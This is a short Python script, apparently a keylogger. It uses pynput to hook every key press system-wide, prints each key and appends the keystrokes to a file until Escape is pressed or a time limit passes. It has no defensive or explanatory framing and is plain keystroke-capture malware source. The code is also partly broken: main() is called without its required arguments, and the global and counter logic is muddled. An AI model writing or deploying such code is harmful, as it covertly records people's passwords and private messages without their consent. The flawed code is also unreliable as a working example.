from pynput.keyboard import Key,Listener
import time

count= 0
keys=[]


def main(path,time_interval):
	
	
	stop=time.time()+time_interval
	
	def pd(k):
		
		global keys
		global count
		
		print(k)
		keys.append(k)
		count+=3
	
		if(count >1): 
			count=0
			write_file(keys)
			keys=[]

	def write_file(keys):											#to save the keys in a file
		with open(path, "a") as f:
			for k in keys:
				kname=str(k).replace("'","") 
				if kname.find("space")>1:
					f.write(" ")
				if kname.find("enter")>0:
					f.write("\n")
				elif kname.find("Key") == -1:
					f.write(kname)


	def rd(k):
		start=time.time()														#to stop recording keys
		if k==Key.esc:
			return False
		if start>stop:
			return False
		
	with Listener(on_press=pd,on_release=rd) as  listener:			#listern to monitor keys
		listener.join()		

if __name__ == "__main__":
	main()